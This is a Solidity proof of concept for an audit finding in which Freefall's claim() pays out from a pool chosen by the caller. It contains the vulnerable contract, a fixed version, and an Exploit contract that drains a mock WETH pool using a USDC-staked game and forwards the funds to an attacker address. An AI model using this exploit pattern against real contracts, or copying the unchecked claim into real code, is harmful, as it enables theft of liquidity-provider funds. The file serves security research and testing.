// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Abster Freefall finding 65079:
// "[H-01] Claim Allows Payouts From an Arbitrary Token Pool, Not the Game's Token".
//
// Freefall.claim(_tokenAddress, _gameId) selects BOTH the liquidity pool it debits
// and the token it pays out from the CALLER-SUPPLIED `_tokenAddress`, and never
// checks that `_tokenAddress == game.tokenAddress` (the token the game was actually
// played with). A player who wagered a small-pool token (USDC) can therefore claim
// the payout out of a large-pool token (WETH), draining WETH liquidity they never
// wagered — a direct cross-asset theft.
//
// Source: linked repo Gaply-Labs/freefall-contract is deleted (404), but the
// vulnerable claim() core is embedded verbatim in the finding (Freefall.sol#L219)
// and is inlined below UNCHANGED (the `// @>` line + the two `<--` lines).
//
// Decimals note: both mock tokens use 18 decimals so the payout arithmetic is
// clean. The reported bug is pool/token SUBSTITUTION and is decimals-agnostic; the
// USDC/WETH labels are illustrative of "small pool vs large pool".
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

/// @dev Minimal faithful ERC20 double for the opaque game tokens (the only
///      genuinely-external boundary; the vulnerable contract itself is real).
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. The claim() body is the verbatim buggy core from the
// finding: the pool + payout token are read from the caller-supplied _tokenAddress
// with NO check against game.tokenAddress.
// ─────────────────────────────────────────────────────────────────────────────
contract Freefall {
    uint256 internal constant BASIS_POINTS = 10000;

    struct Pool {
        uint256 balance;
    }

    struct Game {
        address tokenAddress;
        uint256 betAmount;
        uint256 determinedMultiplier;
        address player;
    }

    mapping(address => Pool) public liquidityPool;
    mapping(uint256 => Game) public games;
    mapping(string => uint256) public offChainGameIdToOnChainGameId;
    uint256 public nextOnChainGameId = 1;

    /// @notice A liquidity provider seeds a token's pool.
    function addLiquidity(address _tokenAddress, uint256 amount) external {
        IERC20(_tokenAddress).transferFrom(msg.sender, address(this), amount);
        liquidityPool[_tokenAddress].balance += amount;
    }

    /// @notice A player opens a game staking `betAmount` of `_tokenAddress`.
    function createGame(address _tokenAddress, uint256 betAmount, string calldata _gameId)
        external
        returns (uint256)
    {
        IERC20(_tokenAddress).transferFrom(msg.sender, address(this), betAmount);
        liquidityPool[_tokenAddress].balance += betAmount;

        uint256 onChainGameId = nextOnChainGameId++;
        offChainGameIdToOnChainGameId[_gameId] = onChainGameId;
        games[onChainGameId] = Game({
            tokenAddress: _tokenAddress,
            betAmount: betAmount,
            determinedMultiplier: 0,
            player: msg.sender
        });
        return onChainGameId;
    }

    /// @notice VRNG boundary: records the resolved win multiplier for a game.
    function resolve(string calldata _gameId, uint256 multiplier) external {
        uint256 onChainGameId = offChainGameIdToOnChainGameId[_gameId];
        games[onChainGameId].determinedMultiplier = multiplier;
    }

    // ─── verbatim vulnerable claim() core (finding 65079, Freefall.sol#L219) ───
    function claim(address _tokenAddress, string calldata _gameId) external {
        Pool storage pool = liquidityPool[_tokenAddress]; // @> pool chosen from caller-supplied _tokenAddress, never checked == game.tokenAddress
        uint256 onChainGameId = offChainGameIdToOnChainGameId[_gameId];
        Game storage game = games[onChainGameId];

        // payout computed from game.tokenAddress's bet
        uint256 payout = (game.betAmount * game.determinedMultiplier) / BASIS_POINTS;

        pool.balance -= payout;                                  // <-- drains wrong pool
        tokenTransfer(_tokenAddress, payout, msg.sender);        // <-- sends attacker chosen token
    }

    function tokenTransfer(address _tokenAddress, uint256 amount, address to) internal {
        IERC20(_tokenAddress).transfer(to, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract: binds the claim to the game's token per the finding's
// recommendation — `require(_tokenAddress == game.tokenAddress)`. The cross-token
// claim now reverts, so the WETH pool cannot be drained by a USDC game.
// ─────────────────────────────────────────────────────────────────────────────
contract FreefallFixed {
    uint256 internal constant BASIS_POINTS = 10000;

    struct Pool {
        uint256 balance;
    }

    struct Game {
        address tokenAddress;
        uint256 betAmount;
        uint256 determinedMultiplier;
        address player;
    }

    mapping(address => Pool) public liquidityPool;
    mapping(uint256 => Game) public games;
    mapping(string => uint256) public offChainGameIdToOnChainGameId;
    uint256 public nextOnChainGameId = 1;

    function addLiquidity(address _tokenAddress, uint256 amount) external {
        IERC20(_tokenAddress).transferFrom(msg.sender, address(this), amount);
        liquidityPool[_tokenAddress].balance += amount;
    }

    function createGame(address _tokenAddress, uint256 betAmount, string calldata _gameId)
        external
        returns (uint256)
    {
        IERC20(_tokenAddress).transferFrom(msg.sender, address(this), betAmount);
        liquidityPool[_tokenAddress].balance += betAmount;

        uint256 onChainGameId = nextOnChainGameId++;
        offChainGameIdToOnChainGameId[_gameId] = onChainGameId;
        games[onChainGameId] = Game({
            tokenAddress: _tokenAddress,
            betAmount: betAmount,
            determinedMultiplier: 0,
            player: msg.sender
        });
        return onChainGameId;
    }

    function resolve(string calldata _gameId, uint256 multiplier) external {
        uint256 onChainGameId = offChainGameIdToOnChainGameId[_gameId];
        games[onChainGameId].determinedMultiplier = multiplier;
    }

    function claim(address _tokenAddress, string calldata _gameId) external {
        uint256 onChainGameId = offChainGameIdToOnChainGameId[_gameId];
        Game storage game = games[onChainGameId];
        require(_tokenAddress == game.tokenAddress, "Invalid token for claim"); // FIX: bind claim to the game's token
        Pool storage pool = liquidityPool[_tokenAddress];
        uint256 payout = (game.betAmount * game.determinedMultiplier) / BASIS_POINTS;
        pool.balance -= payout;
        tokenTransfer(_tokenAddress, payout, msg.sender);
    }

    function tokenTransfer(address _tokenAddress, uint256 amount, address to) internal {
        IERC20(_tokenAddress).transfer(to, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver. The Exploit orchestrates protocol liquidity + the attacker's
// play, then forwards the stolen WETH to the attacker EOA (0x1111...1111). The
// attacker's game was staked entirely in USDC (game.tokenAddress == USDC), yet the
// attacker walks away with the WETH pool.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    // Small-pool token (USDC) vs large-pool token (WETH).
    uint256 internal constant USDC_POOL = 5_000 ether;
    uint256 internal constant WETH_POOL = 100 ether;   // the large pool that gets drained
    uint256 internal constant BET = 1 ether;           // wagered in USDC
    uint256 internal constant MULTIPLIER = 1_000_000;  // 100x in basis points (10000 = 1x)

    // Exposed results for the driver.
    address public freefallAddr;
    address public freefallFixedAddr;
    address public usdcAddr;
    address public wethAddr;
    address public markerAddr;    // the profit token IS the stolen WETH; alias for schema
    address public vulnAddr;

    uint256 public payout;
    uint256 public gameId;
    address public gameTokenAddress;

    uint256 public wethPoolBefore;
    uint256 public wethPoolAfter;
    uint256 public freefallWethBalBefore;
    uint256 public freefallWethBalAfter;
    uint256 public attackerWethBefore;
    uint256 public attackerWethAfter;
    uint256 public attackerWethGain;

    bool public fixedRevertedOnCrossTokenClaim;

    function run() external payable {
        // --- deploy tokens + the real vulnerable contract + the fixed control ---
        MiniToken usdc = new MiniToken("USD Coin", "USDC");        // nonce 1
        MiniToken weth = new MiniToken("Wrapped Ether", "WETH");   // nonce 2
        Freefall freefall = new Freefall();                        // nonce 3
        FreefallFixed fixedFreefall = new FreefallFixed();         // nonce 4

        freefallAddr = address(freefall);
        freefallFixedAddr = address(fixedFreefall);
        usdcAddr = address(usdc);
        wethAddr = address(weth);
        markerAddr = address(weth); // stolen asset == profit token
        vulnAddr = address(freefall);

        // --- protocol liquidity: seed both pools (small USDC, large WETH) ---
        usdc.mint(address(this), USDC_POOL);
        weth.mint(address(this), WETH_POOL);
        usdc.approve(address(freefall), type(uint256).max);
        weth.approve(address(freefall), type(uint256).max);
        freefall.addLiquidity(address(usdc), USDC_POOL);
        freefall.addLiquidity(address(weth), WETH_POOL);

        // --- attacker plays a game staked in USDC (the SMALL pool) ---
        usdc.mint(address(this), BET);
        // approval already covers max
        gameId = freefall.createGame(address(usdc), BET, "attacker-game");
        freefall.resolve("attacker-game", MULTIPLIER); // VRNG resolves a 100x win

        payout = (BET * MULTIPLIER) / 10000; // 100 ether

        // record the game's real token (proves the wager was USDC, never WETH)
        (gameTokenAddress, , , ) = freefall.games(gameId);

        // --- snapshot before the cross-token claim ---
        (wethPoolBefore) = _wethPool(freefall);
        freefallWethBalBefore = weth.balanceOf(address(freefall));
        attackerWethBefore = weth.balanceOf(ATTACKER);

        // --- THE BUG: claim the USDC game's payout out of the WETH pool ---
        freefall.claim(address(weth), "attacker-game"); // sends `payout` WETH to msg.sender (this Exploit)

        // --- forward the stolen WETH to the attacker EOA (the beneficiary) ---
        weth.transfer(ATTACKER, payout);

        // --- snapshot after ---
        (wethPoolAfter) = _wethPool(freefall);
        freefallWethBalAfter = weth.balanceOf(address(freefall));
        attackerWethAfter = weth.balanceOf(ATTACKER);
        attackerWethGain = attackerWethAfter - attackerWethBefore;

        // --- negative control: same setup on the FIXED contract must revert ---
        fixedRevertedOnCrossTokenClaim = _controlRevertsOnFixed(usdc, weth, fixedFreefall);

        // --- HARM assertions (concrete cross-asset theft) ---
        require(gameTokenAddress == address(usdc), "game must be staked in USDC");
        require(attackerWethGain == payout && payout > 0, "attacker did not receive WETH payout");
        require(wethPoolAfter < wethPoolBefore, "WETH pool not drained");
        require(wethPoolAfter == 0, "WETH pool should be fully drained");
        require(freefallWethBalAfter == 0, "contract should hold no WETH after theft");
        require(fixedRevertedOnCrossTokenClaim, "fixed variant must reject the cross-token claim");
    }

    function _wethPool(Freefall f) internal view returns (uint256 bal) {
        (bal) = f.liquidityPool(wethAddr);
    }

    function _controlRevertsOnFixed(MiniToken usdc, MiniToken weth, FreefallFixed fixedFreefall)
        internal
        returns (bool reverted)
    {
        // seed the fixed contract identically
        usdc.mint(address(this), USDC_POOL);
        weth.mint(address(this), WETH_POOL);
        usdc.approve(address(fixedFreefall), type(uint256).max);
        weth.approve(address(fixedFreefall), type(uint256).max);
        fixedFreefall.addLiquidity(address(usdc), USDC_POOL);
        fixedFreefall.addLiquidity(address(weth), WETH_POOL);

        usdc.mint(address(this), BET);
        fixedFreefall.createGame(address(usdc), BET, "control-game");
        fixedFreefall.resolve("control-game", MULTIPLIER);

        try fixedFreefall.claim(address(weth), "control-game") {
            reverted = false; // fix failed to block the cross-token claim
        } catch {
            reverted = true; // fix correctly rejects claiming WETH for a USDC game
        }
    }
}
